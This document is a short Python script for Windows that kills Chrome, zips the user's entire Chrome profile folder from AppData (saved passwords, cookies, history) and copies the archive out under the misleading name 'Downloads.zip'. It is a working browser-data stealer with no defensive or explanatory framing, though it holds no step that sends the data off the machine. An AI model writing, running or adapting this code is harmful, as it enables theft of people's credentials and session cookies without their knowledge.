import os
import shutil

user =  os.getlogin()
drive = os.getenv("SystemDrive")
drive1 = os.getcwd()
path2 = drive + "//Users/" + user + "/AppData/Local/Google"


os.chdir(path2)

os.system('TASKKILL /F /IM chrome.exe')
root_directory='Chrome'
shutil.make_archive("Chrome","zip",root_directory)
shutil.copy(src="Chrome.zip", dst=drive1+"Downloads.zip")  